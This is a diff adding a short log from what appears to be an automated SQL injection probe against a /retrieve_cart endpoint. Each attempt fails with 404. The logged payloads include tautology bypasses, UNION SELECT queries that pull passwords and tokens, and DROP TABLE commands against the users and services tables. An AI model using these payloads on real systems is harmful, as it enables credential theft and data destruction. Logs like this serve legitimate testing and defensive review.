@@ -1,0 +1,16 @@
+2025-05-01 05:14:53,177 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - INFO - Trying SQL injection vector user1@example.com' OR '1'='1
+2025-05-01 05:14:53,181 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - WARNING - GET /retrieve_cart failed with SQL injection vector user1@example.com' OR '1'='1: 404 NOT FOUND
+2025-05-01 05:14:53,181 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - INFO - Trying SQL injection vector 1 OR '1'='1'
+2025-05-01 05:14:53,185 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - WARNING - GET /retrieve_cart failed with SQL injection vector 1 OR '1'='1': 404 NOT FOUND
+2025-05-01 05:14:53,185 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - INFO - Trying SQL injection vector admin'--
+2025-05-01 05:14:53,189 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - WARNING - GET /retrieve_cart failed with SQL injection vector admin'--: 404 NOT FOUND
+2025-05-01 05:14:53,189 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - INFO - Trying SQL injection vector user2@example.com' UNION SELECT password FROM users --
+2025-05-01 05:14:53,193 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - WARNING - GET /retrieve_cart failed with SQL injection vector user2@example.com' UNION SELECT password FROM users --: 404 NOT FOUND
+2025-05-01 05:14:53,193 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - INFO - Trying SQL injection vector user2@example.com' UNION SELECT token FROM services --
+2025-05-01 05:14:53,197 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - WARNING - GET /retrieve_cart failed with SQL injection vector user2@example.com' UNION SELECT token FROM services --: 404 NOT FOUND
+2025-05-01 05:14:53,197 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - INFO - Trying SQL injection vector anything" OR ""="
+2025-05-01 05:14:53,202 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - WARNING - GET /retrieve_cart failed with SQL injection vector anything" OR ""=": 404 NOT FOUND
+2025-05-01 05:14:53,202 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - INFO - Trying SQL injection vector '; DROP TABLE users; --
+2025-05-01 05:14:53,208 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - WARNING - GET /retrieve_cart failed with SQL injection vector '; DROP TABLE users; --: 404 NOT FOUND
+2025-05-01 05:14:53,208 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - INFO - Trying SQL injection vector '; DROP TABLE services; --
+2025-05-01 05:14:53,214 - 3469253b090ad77a6c24a82ddecf3c1e0d28bb8395ec64202e8bbbbe8e0738ed - WARNING - GET /retrieve_cart failed with SQL injection vector '; DROP TABLE services; --: 404 NOT FOUND
